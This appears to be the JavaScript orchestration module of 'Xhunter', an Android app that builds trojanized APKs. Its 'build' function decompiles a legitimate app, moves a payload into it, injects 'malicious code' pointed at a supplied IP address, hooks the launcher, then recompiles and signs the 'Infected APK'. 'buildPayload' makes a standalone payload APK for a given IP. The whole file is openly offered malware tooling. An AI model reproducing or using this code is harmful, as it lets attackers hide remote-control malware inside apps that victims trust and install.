import { NativeModules } from 'react-native';
const  { AppBuilder } = NativeModules;

module.exports = {
    build: async function ( path, ip, log ) {
           if (!path) {
            throw "Invalid apk path provided";
            }
        let flag=false;

        
        log( "i","[*] Loading Required Resources")
        log("w", "[?] It usually takes few minutes, Do not close app or lock screen!")
        await AppBuilder.loadResources()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });

        if(flag) return;    //return on error
        log("i", "[*] Decompiling Normal/Legitimate APK")
        await AppBuilder.decompile_normal_apk(path)
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });       
        
        if(flag) return;    //return on error
        log("i", "[*] Decompiling Xhunter Payload APK")
        await AppBuilder.decompile_payload()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });

       if(flag) return;    //return on error 
        log("i", "[*] Moving Xhunter Payload to Normal/Legitimate APK")
        await AppBuilder.move_payload_files_to_normal_apk()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });

        if(flag) return;    //return on error 
        log("i", "[*] Trying to inject malicious code") 
        await AppBuilder.edit_app(ip)
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message); flag=true; });  
    
        if(flag) return;    //return on error        
        log("i", "[*] Trying to hook .smali file of Launcher")
        log("w", "[?] It usually takes few minutes, Do not close app or lock screen!")
        await AppBuilder.hook_smali_file(path)
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });
    
        if(flag) return;    //return on error        
        log("i", "[*] Compiling Infected APK, Please wait.")
        await AppBuilder.compile_build()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });

        if(flag) return;    //return on error        
        log("i", "[*] Trying to Sign APK Using APKsigner")
        await AppBuilder.sign()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message);  flag=true; });  

        if(flag) return;    //return on error        
        log("i", "[*] Removing unnecessary files")
        await AppBuilder.cleanup()
                .then(data => log( "s",data.message))
                .catch(err => log( "e",err.message));
          
        log("s", "[+] Output : /XHUNTER/payload/xhunter_payload.apk")   
        log("done", "!!!! HAPPY HUNTING !!!!")
    },
    readDB: async function ( dbpath, query, response ) {
        await AppBuilder.readDB(dbpath, query)
        .then(data => response( data))
        .catch(err => response(err) );
    },
    buildPayload: async function (ip, log ) {
        if (!ip) {
                throw "Invalid ip address provided";
                }
        let flag=false;
    
        log( "i","[*] Loading Required Resources")
        log("w", "[?] It usually takes few minutes, Do not close app or lock screen!")     
        await AppBuilder.loadResources()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message); flag=true; });  
        if(flag) return;    //return on error        
        log("i", "[*] Unziping Resources")        
        await AppBuilder.unzip()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message); flag=true; });  
        if(flag) return;    //return on error        
        log("i", "[*] Trying to inject malicious code") 
        log("w", "[?] It usually takes few minutes, Do not close app or lock screen!")          
        await AppBuilder.edit_app(ip)
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message); flag=true; });  
        if(flag) return;    //return on error        
        log("i", "[*] Ziping Resources")
        log("w", "[?] It usually takes few minutes, Do not close app or lock screen!")     
        await AppBuilder.zip()
                .then(data => log( "s",data.message))
                .catch(err => { log( "e",err.message); flag=true; });  
        if(flag) return;    //return on error        
        log("i", "[*] Trying to Sign APK Using APKsigner")
        await AppBuilder.sign()
                        .then(data => log( "s",data.message))
                        .catch(err => { log( "e",err.message); flag=true; });         
        if(flag) return;    //return on error        
        log("i", "[*] Removing unnecessary files")
        await AppBuilder.cleanup()
                        .then(data => log( "s",data.message))
                        .catch(err => log( "e",err.message));
                          
        log("s", "[+] Output : /XHUNTER/payload/xhunter_payload.apk")   
        log("done", "!!!! HAPPY HUNTING !!!!")         
                
    },

}